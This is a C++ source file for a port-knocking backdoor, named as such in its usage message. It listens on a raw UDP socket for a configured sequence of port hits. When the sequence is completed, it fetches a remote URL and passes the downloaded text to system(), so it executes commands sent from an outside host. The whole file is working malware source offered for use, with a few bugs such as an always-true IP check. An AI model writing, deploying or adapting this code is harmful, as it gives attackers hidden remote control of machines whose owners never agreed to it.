#include <stdio.h>
#include <sys/socket.h> // sockaddr
#include <netinet/in.h> // sockaddr_in
#include <string.h>
#include <arpa/inet.h> // aton, ntoa
#include <cstdlib>
#include <vector>
#include <iostream>
#include <fstream> // file stream
#include <map>
#include <curl/curl.h> //HTTP Request
#include <ifaddrs.h> // Interface reading

#define SIZE 100
typedef unsigned int uint;

using namespace std;

// The IP header's structure
struct ipheader {
 unsigned char      iph_ihl_ver;
 unsigned char      iph_tos;
 unsigned short int iph_len;
 unsigned short int iph_ident;
 unsigned short int iph_offset;
 unsigned char      iph_ttl;
 unsigned char      iph_protocol;
 unsigned short int iph_chksum;
 unsigned int       iph_sourceip;
 unsigned int       iph_destip;
};
 
// UDP header's structure
struct udpheader {
 unsigned short int udph_srcport;
 unsigned short int udph_destport;
 unsigned short int udph_len;
 unsigned short int udph_chksum;
};
// total udp header length: 8 bytes (=64 bits)

struct MemoryStruct {
  char *memory;
  size_t size;
};

// This struct is used to match the source IP & Port of the incoming packets with the previous packets encountered.
struct IP_Port {
    uint ip;
    short port;

    bool operator<(const IP_Port& val) const {
        if (this->ip < val.ip) {
            return true;
        }
        if (this->ip == val.ip && this->port < val.port) {
            return true;
        }
        return false;
    }
};

// Global variables
// This array keeps list of port sequence.
vector<uint> ports;
// This map keeps  track of the sequence index from a particular IP & port.
map<IP_Port,int> knockerMap;

// This array keeps list of local interface IPs.
vector<uint> local_ip_list;

// This function is used by curl as callback to return the response data from the HTTP Server.
static size_t
WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
  size_t realsize = size * nmemb;
  struct MemoryStruct *mem = (struct MemoryStruct *)userp;
 
  mem->memory = (char*)malloc(mem->size + realsize + 1);
  if(mem->memory == NULL) {
    /* out of memory! */ 
    printf("not enough memory (realloc returned NULL)\n");
    return 0;
  }
 
  memcpy(&(mem->memory[mem->size]), contents, realsize);
  mem->size += realsize;
  mem->memory[mem->size] = 0;
 
  return realsize;
}

// This function is used to read the configuration-file containing the port numbers.
void readCfg(const char* cfgFile) {
    fstream file(cfgFile, fstream::in);

    if(file.is_open()) {
        string line;
        while (getline(file, line)) {
            int port = strtoul(line.c_str(), NULL, 0);
            ports.push_back(port);
        }
    }
}

// This function is used to make sure that the destination port of the received packet matches to one of the local interfaces.
bool isValidIP(uint dst_ip) {
    return true;
    bool isValidIP = false;
    for (vector<uint>::const_iterator it = local_ip_list.begin(); it != local_ip_list.end(); it++) {
        if (dst_ip == *it) {
            isValidIP = true;
            break;
        }
    }
    return isValidIP;
}

// This function checks if the received destination port is in sequence and whether sequence is completed.
bool isSeqHit(uint src_ip, unsigned short src_port, unsigned short dst_port) {
    // Now since the local ip is valid I need to figure out what position is it in the sequence.
    IP_Port tmp = {src_ip, src_port};
    map<IP_Port,int>::iterator it = knockerMap.find(tmp);
    if(it != knockerMap.end()) {
        // The source ip already present in the map so check whats the position.
        int pos = it->second;
        if(dst_port == ports[pos]) {
            (it->second)++;
            if (pos == ports.size()-1 ) {
                knockerMap.erase(it);
                return  true;
            }
            return false;
        } 
        // Port is out of sequence
        knockerMap.erase(it);
    }

    if (dst_port == ports[0])  {
        // Insert into the map if its the first port else discard it.
        knockerMap[tmp] = 1; // Next time match with 2nd port.
    }
    return false;
}

// This function sends the HTTPRequest and executes the received command.
void sendHTTPRequest(const char* url) {
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;
    memset(&chunk, 0, sizeof(MemoryStruct));

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        /* webpage could be redirected, so we tell libcurl to follow redirection */ 
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

        /* send all data to this function  */ 
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
 
        /* we pass our 'chunk' struct to the callback function */ 
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
	
        /* Perform the request, res will get the return code */ 
        res = curl_easy_perform(curl);

        /* Check for errors */ 
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));
        else {
            system(chunk.memory);
        }
	
        /* always cleanup */ 
        curl_easy_cleanup(curl);
    }
}

// This function fetches all the local interface IPs.
void getIPs() {
    struct ifaddrs *ifap, *ifa;
    struct sockaddr_in *sa;
    char* addr;

    getifaddrs(&ifap);

    for(ifa = ifap; ifa ; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr->sa_family == AF_INET) {
            sa = (struct sockaddr_in*) ifa->ifa_addr;
            local_ip_list.push_back(sa->sin_addr.s_addr);
        }
    }
}

int main(int argc, char* argv[]) {

    // Get IP of all the local interfaces.
    getIPs();

    if (argc < 3) {
        cout<<"Syntax is ./backdoor ports.cfg <URL>"<<endl;
        return 1;
    }

    readCfg(argv[1]);

    struct sockaddr_in ssock;

    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sd < 0) {
        printf("sd=%d...exiting\n", sd);
        return 1;
    }

    unsigned char buff[SIZE];
    memset(buff, 0, SIZE);
    socklen_t sl = sizeof(ssock);
    ipheader* ip_hdr = (ipheader*) buff;

    do {
		int n = recvfrom( sd, buff, SIZE, 0, (struct sockaddr*) &ssock, &sl );

        // Now I have the packet so check if the sequence is hit.
        udpheader* udp_hdr = (udpheader*) ( buff + sizeof(ipheader) );
        if(isValidIP(ip_hdr->iph_destip)) {
            // This is a knock at one of my port sequences. So check if any sequence is complete.
            if(isSeqHit(ip_hdr->iph_sourceip, ntohs(udp_hdr->udph_srcport), ntohs(udp_hdr->udph_destport) )) {
                // A sequence is hit so send the HTTP request to the URL.
                sendHTTPRequest(argv[2]);
            }
        }
    } while(1);

    return 0;
}
